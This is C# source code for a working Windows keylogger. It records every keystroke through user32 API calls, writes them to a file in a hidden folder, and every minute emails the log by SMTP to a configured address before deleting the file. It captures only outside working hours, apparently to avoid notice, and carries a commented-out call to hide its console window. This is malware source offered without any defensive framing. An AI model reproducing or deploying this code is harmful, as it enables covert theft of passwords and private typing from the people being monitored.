using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Net.Mail;
using System.Net;
using System.Configuration;

namespace Logs
{
    class Logs : Form
    {
        [DllImport("User32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        //[DllImport("User32.dll")]
        //public static extern int MessageBox(int h,string m,string c, int type);

        public const string alphabets = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

        public static readonly string folderName = ConfigurationManager.AppSettings["folderName"];

        public static readonly string fileName = ConfigurationManager.AppSettings["fileName"];

        static void Start()
        {
            string[] numbers = { "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9", "D0" };
            string[] specialChars = { "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "" };
            Mutex mut = new Mutex();
            string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
            string path = driveName + folderName + "\\" + fileName;
            while (true)
            {
                TimeSpan _timeStart = new TimeSpan(8, 0, 0);
                TimeSpan _timeEnd = new TimeSpan(19, 0, 0);
                TimeSpan now = DateTime.Now.TimeOfDay;
                if ((DateTime.Now.DayOfWeek == DayOfWeek.Saturday || DateTime.Now.DayOfWeek == DayOfWeek.Sunday)
                    || (now < _timeStart || now > _timeEnd))
                {
                    Thread.Sleep(10);
                    for (int i = 0; i < 255; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767)
                        {
                            bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                            bool shift = Control.ModifierKeys == Keys.Shift;
                            string toStringText = Convert.ToString((Keys)i);
                            if (numbers.Contains(toStringText) && !shift)
                            {
                                string number = Convert.ToString(toStringText.ToArray()[1]);
                                toStringText = number;
                            }
                            if (alphabets.Contains(toStringText))
                            {
                                if (!CapsLock && !(shift))
                                {
                                    toStringText = toStringText.ToLower();
                                }
                            }
                            else if (numbers.Contains(toStringText))
                            {
                                if (shift)
                                {
                                    switch (toStringText)
                                    {
                                        case "D1": { toStringText = "!"; break; }
                                        case "D2": { toStringText = "@"; break; }
                                        case "D3": { toStringText = "#"; break; }
                                        case "D4": { toStringText = "$"; break; }
                                        case "D5": { toStringText = "%"; break; }
                                        case "D6": { toStringText = "^"; break; }
                                        case "D7": { toStringText = "&"; break; }
                                        case "D8": { toStringText = "*"; break; }
                                        case "D9": { toStringText = "("; break; }
                                        case "D0": { toStringText = ")"; break; }
                                        default: { break; }
                                    }
                                }
                            }
                            else if (toStringText.Contains("Oem") || string.Compare(toStringText, "Space") == 0)
                            {
                                switch (toStringText)
                                {
                                    case "Oemtilde": { toStringText = shift ? "~" : "`"; break; }
                                    case "OemMinus": { toStringText = shift ? "_" : "-"; break; }
                                    case "Oemplus": { toStringText = shift ? "+" : "="; break; }
                                    case "OemOpenBrackets": { toStringText = shift ? "{" : "["; break; }
                                    case "Oem6": { toStringText = shift ? "}" : "]"; break; }
                                    case "Oem5": { toStringText = shift ? "|" : "\\"; break; }
                                    case "Oem1": { toStringText = shift ? ":" : ";"; break; }
                                    case "Oem7": { toStringText = shift ? "\"" : "'"; break; }
                                    case "Oemcomma": { toStringText = shift ? "<" : ","; break; }
                                    case "OemPeriod": { toStringText = shift ? ">" : "."; break; }
                                    case "OemQuestion": { toStringText = shift ? "?" : "/"; break; }
                                    case "Space": { toStringText = " "; break; }
                                    default: { break; }
                                }
                            }
                            else if (string.Compare(toStringText, "ShiftKey") == 0 || string.Compare(toStringText, "RShiftKey") == 0 || string.Compare(toStringText, "LShiftKey") == 0)
                            {
                                toStringText = "";
                            }
                            else
                            {
                                toStringText = Environment.NewLine + toStringText + Environment.NewLine;
                            }

                            mut.WaitOne();

                            File.AppendAllText(path, toStringText);
                            Console.Write(toStringText);

                            mut.ReleaseMutex();

                            break;
                        }
                    }
                }
            }
        }

        static void sendMail()
        {
            Mutex mut = new Mutex();
            string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
            string path = driveName + folderName + "\\" + fileName;
            while (true)
            {
                TimeSpan _timeStart = new TimeSpan(8, 0, 0);
                TimeSpan _timeEnd = new TimeSpan(19, 0, 0);
                TimeSpan now = DateTime.Now.TimeOfDay;
                if ((DateTime.Now.DayOfWeek == DayOfWeek.Saturday || DateTime.Now.DayOfWeek == DayOfWeek.Sunday)
                    || (now < _timeStart || now > _timeEnd))
                {
                    DateTime previous_time = DateTime.Now;
                    Thread.Sleep(60000); //time in Milliseconds 60000 ms = 1 min

                    string smtpHost = ConfigurationManager.AppSettings["smtpHost"];
                    string smtpPort = ConfigurationManager.AppSettings["smtpPort"];

                    string fromEmail = ConfigurationManager.AppSettings["fromEmail"];
                    string EmailPassword = ConfigurationManager.AppSettings["EmailPassword"];
                    string toEmail = ConfigurationManager.AppSettings["toEmail"];

                    MailAddress from = new MailAddress(fromEmail);
                    MailAddress to = new MailAddress(toEmail);
                    MailMessage mail = new MailMessage(from, to);
                    mail.Subject = "KeyStroked between " + previous_time + " and " + DateTime.Now;

                    if (File.Exists(path))
                    {
                        mut.WaitOne();
                        mail.Body = File.ReadAllText(path);
                        mut.ReleaseMutex();
                        SmtpClient smtp = new SmtpClient();
                        smtp.Host = smtpHost;
                        smtp.Port = Convert.ToInt32(smtpPort);
                        smtp.Credentials = new NetworkCredential(fromEmail, EmailPassword);
                        smtp.EnableSsl = true;
                        try
                        {
                            smtp.Send(mail);
                        }
                        catch (Exception e)
                        {
                            //Console.WriteLine("Some Exception Occured. Exception Details...");
                            //Console.WriteLine(e);

                        }
                        mut.WaitOne();
                        File.Delete(path);
                        mut.ReleaseMutex();
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, SW_HIDE);
            //Thread.Sleep(5000);
            string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
            string path = driveName + folderName + "\\";
            DirectoryInfo di = Directory.CreateDirectory(path);
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            Thread thread_Logger = new Thread(Start);
            thread_Logger.Start();
            Thread thread_Mail = new Thread(sendMail);
            thread_Mail.Start();
        }
    }
}
